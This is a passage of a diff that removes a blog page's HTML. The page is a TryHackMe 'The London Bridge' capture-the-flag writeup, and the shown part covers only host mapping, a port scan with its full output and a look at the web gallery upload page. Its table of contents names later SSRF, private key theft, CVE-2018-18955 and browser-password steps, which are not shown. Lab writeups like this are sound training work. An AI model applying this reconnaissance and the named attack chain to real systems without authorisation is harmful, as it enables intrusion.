@@ -1,348 +1,1046 @@
-<!doctype html><html lang=en dir=ltr><head><title>The London Bridge | THM Writeup :: CyberJagadeesh - Learn Cyber Security</title>
-<meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Introduction Detailed walkthroughs for The London Bridge CTF challenges on TryHackMe .
-Shell as beth echo &amp;#34;10.10.72.132 londonbridge.thm&amp;#34; &amp;gt;&amp;gt; /etc/hosts Mappped the ip to domain londonbridge.thm.
-Rustscan $ rustscan -a londonbridge.thm -- -sC -sV PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 58:c1:e4:79:ca:70:bc:3b:8d:b8:22:17:2f:62:1a:34 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDziNs6aSHIQOJFilv8PhCPd676iD1TrhMYe4p4Mj2E3yaAl4xb8DNT2dhpcv6H8EvtCJnAbXmnFTTOZy14fd7FKc2/Mr4MNLsINFpMU8hc85g6S9ZEnWKlU8dw5jUUeZnAbHSTnq6ARvEbT/Y5seiWEJ7IBiUqptlUA2eiOU7g0DFwrYH7n40aDe0m6PKPIfI9G0XO0cJHISeJ0bsSES1uun2WHLM0sRx+17hrBgM2YfD9OevcltVMlQqWasP9lqf2ooOdBvQTq4eH5UyyuEzaRtQwBYP/wWQEVFacejJE1iT2VD6ZAilhlzo9mww9vqTEwGTvatH65wiyCZHMvrSb | 256 2a:b4:1f:2c:72:35:7a:c3:7a:5c:7d:47:d6:d0:73:c8 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJuZrGZxDIlI4pU1KNZ8A87cWFcgHxRSt7yFgBtJoUQMhNmcw8FSVC54b7sBYXCgBsgISZfWYPjBM9kikh8Jnkw= | 256 1c:7e:d2:c9:dd:c2:e4:ac:11:7e:45:6a:2f:44:af:0f (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICkCeqFADY/YvhJyJabcs5DVTYbl/DEKEpBoluTuDdB1 8080/tcp open http-proxy syn-ack ttl 60 gunicorn |_http-server-header: gunicorn | fingerprint-strings: | GetRequest: | HTTP/1."><meta name=keywords content="cyber security,penetration testing,ethical hacking,vulnerability assessment,network security,application security,web application security,security testing,red teaming,bug bounty,CTFs,cybersecurity challenges,hacking tutorials,security tools,exploit development,reverse engineering,penetration tester,security researcher,security analyst,information security,digital forensics,incident response,threat intelligence,security awareness,social engineering,phishing,malware analysis,cryptography,cloud security,IoT security,mobile security,how to become a penetration tester,penetration testing tools,CTF challenges for beginners,web application penetration testing,network penetration testing,exploit development tutorial,reverse engineering techniques,bug bounty hunting tips,security research projects,cyber security certifications"><meta name=robots content="noodp"><link rel=manifest href=/manifest.json><meta property="og:url" content="https://cyberjagadeesh.github.io/posts/thelondonbridge/writeup/"><meta property="og:site_name" content="CyberJagadeesh"><meta property="og:title" content="The London Bridge | THM Writeup"><meta property="og:description" content='Introduction Detailed walkthroughs for The London Bridge CTF challenges on TryHackMe .
-Shell as beth echo "10.10.72.132 londonbridge.thm" >> /etc/hosts Mappped the ip to domain londonbridge.thm.
-Rustscan $ rustscan -a londonbridge.thm -- -sC -sV PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 58:c1:e4:79:ca:70:bc:3b:8d:b8:22:17:2f:62:1a:34 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDziNs6aSHIQOJFilv8PhCPd676iD1TrhMYe4p4Mj2E3yaAl4xb8DNT2dhpcv6H8EvtCJnAbXmnFTTOZy14fd7FKc2/Mr4MNLsINFpMU8hc85g6S9ZEnWKlU8dw5jUUeZnAbHSTnq6ARvEbT/Y5seiWEJ7IBiUqptlUA2eiOU7g0DFwrYH7n40aDe0m6PKPIfI9G0XO0cJHISeJ0bsSES1uun2WHLM0sRx+17hrBgM2YfD9OevcltVMlQqWasP9lqf2ooOdBvQTq4eH5UyyuEzaRtQwBYP/wWQEVFacejJE1iT2VD6ZAilhlzo9mww9vqTEwGTvatH65wiyCZHMvrSb | 256 2a:b4:1f:2c:72:35:7a:c3:7a:5c:7d:47:d6:d0:73:c8 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJuZrGZxDIlI4pU1KNZ8A87cWFcgHxRSt7yFgBtJoUQMhNmcw8FSVC54b7sBYXCgBsgISZfWYPjBM9kikh8Jnkw= | 256 1c:7e:d2:c9:dd:c2:e4:ac:11:7e:45:6a:2f:44:af:0f (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICkCeqFADY/YvhJyJabcs5DVTYbl/DEKEpBoluTuDdB1 8080/tcp open http-proxy syn-ack ttl 60 gunicorn |_http-server-header: gunicorn | fingerprint-strings: | GetRequest: | HTTP/1.'><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-10-02T23:46:18+05:30"><meta property="article:modified_time" content="2024-10-02T23:46:18+05:30"><meta property="article:tag" content="SSRF"><meta property="article:tag" content="CVE-2018-18955"><meta property="article:tag" content="Ffuf"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/thm/backtrack/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/block/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/pyrat/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/cheesectf/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/breakme/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/certaindoom/writeup/"><meta name=twitter:card content="summary"><meta name=twitter:title content="The London Bridge | THM Writeup"><meta name=twitter:description content='Introduction Detailed walkthroughs for The London Bridge CTF challenges on TryHackMe .
-Shell as beth echo "10.10.72.132 londonbridge.thm" >> /etc/hosts Mappped the ip to domain londonbridge.thm.
-Rustscan $ rustscan -a londonbridge.thm -- -sC -sV PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 58:c1:e4:79:ca:70:bc:3b:8d:b8:22:17:2f:62:1a:34 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDziNs6aSHIQOJFilv8PhCPd676iD1TrhMYe4p4Mj2E3yaAl4xb8DNT2dhpcv6H8EvtCJnAbXmnFTTOZy14fd7FKc2/Mr4MNLsINFpMU8hc85g6S9ZEnWKlU8dw5jUUeZnAbHSTnq6ARvEbT/Y5seiWEJ7IBiUqptlUA2eiOU7g0DFwrYH7n40aDe0m6PKPIfI9G0XO0cJHISeJ0bsSES1uun2WHLM0sRx+17hrBgM2YfD9OevcltVMlQqWasP9lqf2ooOdBvQTq4eH5UyyuEzaRtQwBYP/wWQEVFacejJE1iT2VD6ZAilhlzo9mww9vqTEwGTvatH65wiyCZHMvrSb | 256 2a:b4:1f:2c:72:35:7a:c3:7a:5c:7d:47:d6:d0:73:c8 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJuZrGZxDIlI4pU1KNZ8A87cWFcgHxRSt7yFgBtJoUQMhNmcw8FSVC54b7sBYXCgBsgISZfWYPjBM9kikh8Jnkw= | 256 1c:7e:d2:c9:dd:c2:e4:ac:11:7e:45:6a:2f:44:af:0f (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICkCeqFADY/YvhJyJabcs5DVTYbl/DEKEpBoluTuDdB1 8080/tcp open http-proxy syn-ack ttl 60 gunicorn |_http-server-header: gunicorn | fingerprint-strings: | GetRequest: | HTTP/1.'><link rel=canonical href=https://cyberjagadeesh.github.io/posts/thelondonbridge/writeup/><link rel="shortcut icon" href=/favicon.ico><link rel=stylesheet href=/css/index.min.1f9b3e6594d41770030cc9cea67e9220cd9066bb33910ebfb19ea46cf6b4b50c.css><script async src="https://www.googletagmanager.com/gtag/js?id=G-376DY6PW0W"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-376DY6PW0W")}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"Article","author":{"@type":"Person","name":"CyberJagadeesh"},"dateModified":"2024-10-02T23:46:18+05:30","datePublished":"2024-10-02T23:46:18+05:30","description":"Introduction Detailed walkthroughs for The London Bridge CTF challenges on TryHackMe .\nShell as beth echo \u0026#34;10.10.72.132 londonbridge.thm\u0026#34; \u0026gt;\u0026gt; /etc/hosts Mappped the ip to domain londonbridge.thm.\nRustscan $ rustscan -a londonbridge.thm -- -sC -sV PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 58:c1:e4:79:ca:70:bc:3b:8d:b8:22:17:2f:62:1a:34 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDziNs6aSHIQOJFilv8PhCPd676iD1TrhMYe4p4Mj2E3yaAl4xb8DNT2dhpcv6H8EvtCJnAbXmnFTTOZy14fd7FKc2/Mr4MNLsINFpMU8hc85g6S9ZEnWKlU8dw5jUUeZnAbHSTnq6ARvEbT/Y5seiWEJ7IBiUqptlUA2eiOU7g0DFwrYH7n40aDe0m6PKPIfI9G0XO0cJHISeJ0bsSES1uun2WHLM0sRx+17hrBgM2YfD9OevcltVMlQqWasP9lqf2ooOdBvQTq4eH5UyyuEzaRtQwBYP/wWQEVFacejJE1iT2VD6ZAilhlzo9mww9vqTEwGTvatH65wiyCZHMvrSb | 256 2a:b4:1f:2c:72:35:7a:c3:7a:5c:7d:47:d6:d0:73:c8 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJuZrGZxDIlI4pU1KNZ8A87cWFcgHxRSt7yFgBtJoUQMhNmcw8FSVC54b7sBYXCgBsgISZfWYPjBM9kikh8Jnkw= | 256 1c:7e:d2:c9:dd:c2:e4:ac:11:7e:45:6a:2f:44:af:0f (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICkCeqFADY/YvhJyJabcs5DVTYbl/DEKEpBoluTuDdB1 8080/tcp open http-proxy syn-ack ttl 60 gunicorn |_http-server-header: gunicorn | fingerprint-strings: | GetRequest: | HTTP/1.","image":"/posts/thelondonbridge/thelondonbridge.png","name":"The London Bridge | THM Writeup","url":"https://cyberjagadeesh.github.io/posts/thelondonbridge/writeup/"}</script></head><body class="flex flex-col min-h-screen w-full bg-slate-50 dark:bg-gray-800"><header class="flex flex-none justify-center z-10"><div class="flex flex-row gap justify-between w-full max-w-4xl lg:max-w-5xl h-12 mt-3"><div class="flex-none ml-2 md:ml-0"><a href=/><img class="h-12 w-12 rounded-full object-cover bg-gray-100" src=/logo.png alt=logo></a></div><div class=flex-1></div><div class=flex-none><nav class="h-full static"><button id=navbar-menu-toggle type=button class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg md:hidden" aria-controls=navbar-menu aria-expanded=false>
-<span class=sr-only>Open main menu</span>
-<i class="w-8 h-8"><svg class="icon icon-tabler icon-tabler-menu-2" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 6h16"/><path d="M4 12h16"/><path d="M4 18h16"/></svg></i></button><div class="absolute md:static top-16 left-0 right-0 z-50 hidden w-full md:block md:w-auto" id=navbar-menu><ul class="flex flex-col mx-2 md:mx-0 md:flex-row md:border-0 rounded-sm md:rounded-full px-3 text-base font-medium text-slate-800 dark:text-slate-200 shadow-lg bg-white dark:bg-gray-600 shadow-slate-800/5 dark:shadow-slate-200/5 ring-1 ring-slate-900/5 dark:ring-slate-100/5"><li id=about><a class="block px-3 py-3 hover:text-emerald-600" href=/about/ title=About>About</a></li><li id=post><a class="block px-3 py-3 hover:text-emerald-600 text-emerald-600" href=/posts/ title=Post>Post</a></li></ul></div></nav></div><div class="flex-none mx-1"></div><div class="flex-none md:hidden"><a href=/search/ class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg" aria-controls=navbar-menu aria-expanded=false><span class=sr-only>Search</span>
-<i class="w-8 h-8"><svg class="icon icon-tabler icon-tabler-search" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1014 0A7 7 0 103 10"/><path d="M21 21l-6-6"/></svg></i></a></div><div class="darkmode-toggle flex flex-none mr-2 md:mr-0"><label for=darkmode-toggle class="flex items-center px-3 cursor-pointer rounded-full bg-gray-100 dark:bg-gray-600" title="Toggle dark mode"><input name=darkmode-toggle id=darkmode-toggle type=checkbox class="sr-only peer" aria-label="Toggle dark mode"><div class="group flex flex-row gap-1 justify-center h-8 px-1 rounded-full bg-white dark:bg-gray-700"><i class="h-6 w-6 flex-none rounded-full bg-yellow-400 place-self-center peer-checked:group-[]:invisible"><svg class="icon icon-tabler icon-tabler-brightness-down" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-3 0a3 3 0 106 0 3 3 0 10-6 0"/><path d="M12 5v.01"/><path d="M17 7v.01"/><path d="M19 12v.01"/><path d="M17 17v.01"/><path d="M12 19v.01"/><path d="M7 17v.01"/><path d="M5 12v.01"/><path d="M7 7v.01"/></svg>
-</i><i class="h-6 w-6 flex-none rounded-full place-self-center invisible peer-checked:group-[]:visible"><svg class="icon icon-tabler icon-tabler-moon-stars" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 3c.132.0.263.0.393.0a7.5 7.5.0 007.92 12.446A9 9 0 1112 2.992z"/><path d="M17 4a2 2 0 002 2 2 2 0 00-2 2 2 2 0 00-2-2 2 2 0 002-2"/><path d="M19 11h2m-1-1v2"/></svg></i></div></label></div></div></header><main class="flex flex-auto justify-center"><div class="w-full max-w-4xl lg:max-w-5xl"><div class="flex flex-col mt-6 mx-2 md:mx-0 rounded-lg overflow-hidden shadow-md bg-white dark:bg-gray-700"><div><a href=/posts/thelondonbridge/writeup/><figure><img class="w-full object-cover h-36 md:h-48 xl:h-60" src=/posts/thelondonbridge/thelondonbridge.png alt="The London Bridge | THM Writeup" title="The London Bridge | THM Writeup" loading=lazy></figure></a></div><div class="flex flex-col gap-y-3 p-6"><h1 class="text-4xl font-semibold text-slate-800 dark:text-slate-100"><a href=/posts/thelondonbridge/writeup/>The London Bridge | THM Writeup</a></h1><ul class="flex flex-row flex-wrap text-slate-500 dark:text-slate-300"><li><a href=/categories/ctf/ class="text-sm mr-2 px-2 py-1 rounded border border-emerald-800 bg-emerald-800 text-slate-50">CTF</a></li><li><a href=/categories/forensic/ class="text-sm mr-2 px-2 py-1 rounded border border-emerald-800 bg-emerald-800 text-slate-50">Forensic</a></li><li><a href=/tags/ssrf/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
-</i><span class=ml-0>SSRF</span></a></li><li><a href=/tags/cve-2018-18955/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
-</i><span class=ml-0>CVE-2018-18955</span></a></li><li><a href=/tags/ffuf/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
-</i><span class=ml-0>Ffuf</span></a></li><li><a href=/series/tryhackme/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
-</i><span class=ml-0>Tryhackme</span></a></li><li><a href=/platforms/linux/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
-</i><span class=ml-0>Linux</span></a></li><li><a href=/levels/medium/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
-</i><span class=ml-0>Medium</span></a></li></ul><div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300"><div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-calendar" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 7a2 2 0 012-2h12a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2V7z"/><path d="M16 3v4"/><path d="M8 3v4"/><path d="M4 11h16"/><path d="M11 15h1"/><path d="M12 15v3"/></svg>
-</i><time datetime=2024-10-02T23:46:18+05:30>2024-10-02</time></div><div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-hourglass-high" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6.5 7h11"/><path d="M6 20v-2a6 6 0 1112 0v2a1 1 0 01-1 1H7a1 1 0 01-1-1z"/><path d="M6 4v2a6 6 0 1012 0V4a1 1 0 00-1-1H7A1 1 0 006 4z"/></svg>
-</i><span>11 minutes to read</span></div></div><section class="prose prose-slate dark:prose-invert w-full max-w-4xl lg:max-w-5xl mt-6"><h2>Table of Contents</h2><aside><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#shell-as-beth>Shell as beth</a><ul><li><a href=#rustscan>Rustscan</a></li><li><a href=#web-server-port8080>Web server (port:8080)</a></li><li><a href=#ffuf>ffuf</a></li><li><a href=#ssrf>SSRF</a></li><li><a href=#extracting-private-key>Extracting private key</a></li></ul></li><li><a href=#privilege-escalation>Privilege Escalation</a><ul><li><a href=#linpeas>linpeas</a></li><li><a href=#cve-2018-18955>CVE-2018-18955</a></li></ul></li><li><a href=#finding-charles-password>Finding Charles Password</a><ul><li><a href=#firefox_decrypt>firefox_decrypt</a></li></ul></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></aside></section><article class="mt-6 w-full max-w-4xl lg:max-w-5xl prose prose-slate dark:prose-invert prose-quoteless post-content"><h2 id=introduction>Introduction</h2><p>Detailed walkthroughs for <a href=https://tryhackme.com/r/room/thelondonbridge target=_blank rel=noopener>The London Bridge</a>
-CTF challenges on <a href=https://tryhackme.com target=_blank rel=noopener>TryHackMe</a>
-.</p><h2 id=shell-as-beth>Shell as beth</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;10.10.72.132 londonbridge.thm&#34;</span> &gt;&gt; /etc/hosts
-</span></span></code></pre></div><p>Mappped the ip to domain <code>londonbridge.thm</code>.</p><h3 id=rustscan>Rustscan</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ rustscan -a londonbridge.thm -- -sC -sV
-</span></span><span class=line><span class=cl>PORT     STATE SERVICE    REASON         VERSION
-</span></span><span class=line><span class=cl>22/tcp   open  ssh        syn-ack ttl <span class=m>60</span> OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
-</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> 58:c1:e4:79:ca:70:bc:3b:8d:b8:22:17:2f:62:1a:34 <span class=o>(</span>RSA<span class=o>)</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDziNs6aSHIQOJFilv8PhCPd676iD1TrhMYe4p4Mj2E3yaAl4xb8DNT2dhpcv6H8EvtCJnAbXmnFTTOZy14fd7FKc2/Mr4MNLsINFpMU8hc85g6S9ZEnWKlU8dw5jUUeZnAbHSTnq6ARvEbT/Y5seiWEJ7IBiUqptlUA2eiOU7g0DFwrYH7n40aDe0m6PKPIfI9G0XO0cJHISeJ0bsSES1uun2WHLM0sRx+17hrBgM2YfD9OevcltVMlQqWasP9lqf2ooOdBvQTq4eH5UyyuEzaRtQwBYP/wWQEVFacejJE1iT2VD6ZAilhlzo9mww9vqTEwGTvatH65wiyCZHMvrSb
-</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 2a:b4:1f:2c:72:35:7a:c3:7a:5c:7d:47:d6:d0:73:c8 <span class=o>(</span>ECDSA<span class=o>)</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> ecdsa-sha2-nistp256 <span class=nv>AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJuZrGZxDIlI4pU1KNZ8A87cWFcgHxRSt7yFgBtJoUQMhNmcw8FSVC54b7sBYXCgBsgISZfWYPjBM9kikh8Jnkw</span><span class=o>=</span>
-</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 1c:7e:d2:c9:dd:c2:e4:ac:11:7e:45:6a:2f:44:af:0f <span class=o>(</span>ED25519<span class=o>)</span>
-</span></span><span class=line><span class=cl><span class=p>|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICkCeqFADY/YvhJyJabcs5DVTYbl/DEKEpBoluTuDdB1
-</span></span><span class=line><span class=cl>8080/tcp open  http-proxy syn-ack ttl <span class=m>60</span> gunicorn
-</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: gunicorn
-</span></span><span class=line><span class=cl><span class=p>|</span> fingerprint-strings: 
-</span></span><span class=line><span class=cl><span class=p>|</span>   GetRequest: 
-</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.0 <span class=m>200</span> OK
-</span></span><span class=line><span class=cl><span class=p>|</span>     Server: gunicorn
-</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Mon, <span class=m>30</span> Sep <span class=m>2024</span> 16:13:38 GMT
-</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: close
-</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>utf-8
-</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>2682</span>
-</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;!DOCTYPE html&gt;
-</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;html <span class=nv>lang</span><span class=o>=</span><span class=s2>&#34;en&#34;</span>&gt;
-</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;head&gt;
-</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;meta <span class=nv>charset</span><span class=o>=</span><span class=s2>&#34;UTF-8&#34;</span>&gt;
-</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;meta <span class=nv>name</span><span class=o>=</span><span class=s2>&#34;viewport&#34;</span> <span class=nv>content</span><span class=o>=</span><span class=s2>&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
-</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;title&gt;Explore London&lt;/title&gt;
-</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;style&gt;
-</span></span><span class=line><span class=cl><span class=p>|</span>     body <span class=o>{</span>
-</span></span><span class=line><span class=cl><span class=p>|</span>     font-family: Arial, sans-serif<span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=p>|</span>     margin: 0<span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=p>|</span>     padding: 0<span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=p>|</span>     background-color: <span class=c1>#f2f2f2;</span>
-</span></span><span class=line><span class=cl><span class=p>|</span>     header <span class=o>{</span>
-</span></span><span class=line><span class=cl><span class=p>|</span>     background-color: <span class=c1>#333;</span>
-</span></span><span class=line><span class=cl><span class=p>|</span>     color: <span class=c1>#fff;</span>
-</span></span><span class=line><span class=cl><span class=p>|</span>     padding: 10px 20px<span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=p>|</span>     text-align: center<span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=p>|</span>     background-color: <span class=c1>#444;</span>
-</span></span><span class=line><span class=cl><span class=p>|</span>     color: <span class=c1>#fff;</span>
-</span></span><span class=line><span class=cl><span class=p>|</span>     padding: 10px 20px<span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=p>|</span>     text-align: center<span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=p>|</span>     color: <span class=c1>#fff;</span>
-</span></span><span class=line><span class=cl><span class=p>|</span>     text-decoration: none<span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=p>|</span>     margin: <span class=m>0</span> 10p
-</span></span><span class=line><span class=cl><span class=p>|</span>   HTTPOptions: 
-</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.0 <span class=m>200</span> OK
-</span></span><span class=line><span class=cl><span class=p>|</span>     Server: gunicorn
-</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Mon, <span class=m>30</span> Sep <span class=m>2024</span> 16:13:39 GMT
-</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: close
-</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>utf-8
-</span></span><span class=line><span class=cl><span class=p>|</span>     Allow: HEAD, OPTIONS, GET
-</span></span><span class=line><span class=cl><span class=p>|</span>_    Content-Length: <span class=m>0</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
-</span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: HEAD OPTIONS GET
-</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Explore London
-</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
-</span></span></code></pre></div><p>From the above result we know,</p><ol><li>2 open ports are available <code>port 22 (ssh)</code> and <code>port 8080 (web server)</code>.</li><li>SSH version: <code>OpenSSH 7.6p1 Ubuntu 4ubuntu0.7</code></li><li>Web server:<ul><li>Server: <code>gunicorn</code></li><li>Methods Allowed: <code>HEAD, OPTIONS, GET</code></li></ul></li></ol><h3 id=web-server-port8080>Web server (port:8080)</h3><p><figure><img src=/posts/thelondonbridge/1.png title="Home Page" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Home Page</strong></figcaption></figure>Here is the Welcome page of the web server.</p><p><figure><img src=/posts/thelondonbridge/2.png title=Gallery style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Gallery</strong></figcaption></figure>We have a gallery page, where we can upload our photos(images) here, it will immediately reflect on the page. Uploading files other than images giving <code>Uploaded file is not image</code> error.</p><p><figure><img src=/posts/thelondonbridge/3.png title="Contact page" style="display:block;margin:0 